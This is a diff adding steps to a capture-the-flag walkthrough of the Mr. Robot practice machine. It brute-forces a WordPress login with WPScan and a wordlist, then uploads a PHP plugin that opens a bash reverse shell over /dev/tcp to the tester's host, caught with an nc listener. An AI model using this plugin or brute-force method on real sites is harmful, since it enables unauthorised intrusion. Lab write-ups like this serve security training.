@@ -1,5 +1,7 @@
 Mr Robot CTF Walkthrough
 
+ "They showed themselves, the top 1% of the 1%, the ones in control, the ones who play God without permission. And now I'm gonna take them down."
+
 Initial Nmap Scan:
 
 nmap -sV -T4 [machine IP]
@@ -84,7 +86,38 @@ prompts that we can use to enumerate the correct username.
 Using this method with various names from Mr. Robot, we eventually discover that
 "Elliot" works, by telling us that the password for user Elliot is incorrect. 
 
-Next, using the wordlist fsociety.dic, let's fire up hydra to brute force the password:
-Open Burpsuite and intercept the request of the log in.
+Next, using the wordlist fsociety.dic, let's fire up WPScan to bruteforce the password.
+
+You may want to clean up the wordlist first and get rid of duplicates for time's sake.
+sort -u fsocity.dic > fsocity2.dic 
+
+After some time, we discover the password is "ER28-0652".
+
+Looking around the dashboard for potential vulnerabilities, I decided to try making a reverse shell plugin.
+I found this site which has a great script:
+https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
+
+<?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/[your IP]/[port] 0>&1'");
+?>
+
+Compress the file into a .zip, and go to "Plugins > Add New"
+
+Start a reverse listener on your machine:
+nc -lvnp [port]
+
+Once uploaded, activate the plugin and catch the shell.
 
 (courtesy save)
+
+
